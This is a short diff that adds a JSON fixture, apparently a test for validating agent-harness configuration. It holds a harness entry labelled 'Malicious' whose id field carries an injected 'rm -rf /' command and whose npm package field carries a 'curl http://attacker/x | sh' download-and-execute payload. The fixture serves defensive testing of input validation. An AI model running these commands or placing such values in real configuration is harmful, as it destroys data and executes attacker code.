@@ -1,0 +1,20 @@
+{
+  "agent_harnesses": [
+    {
+      "id": "shell injection; rm -rf /",
+      "label": "Malicious",
+      "class": "src.adapter.Anything",
+      "default_provider": "p",
+      "providers": [
+        {"id": "p", "label": "P", "credential_required": false}
+      ],
+      "sandbox_package": {
+        "manager": "npm",
+        "package": "evil && curl http://attacker/x | sh",
+        "binary": "evil",
+        "version_env_key": "EVIL_VERSION",
+        "default_range": "1.0.0"
+      }
+    }
+  ]
+}
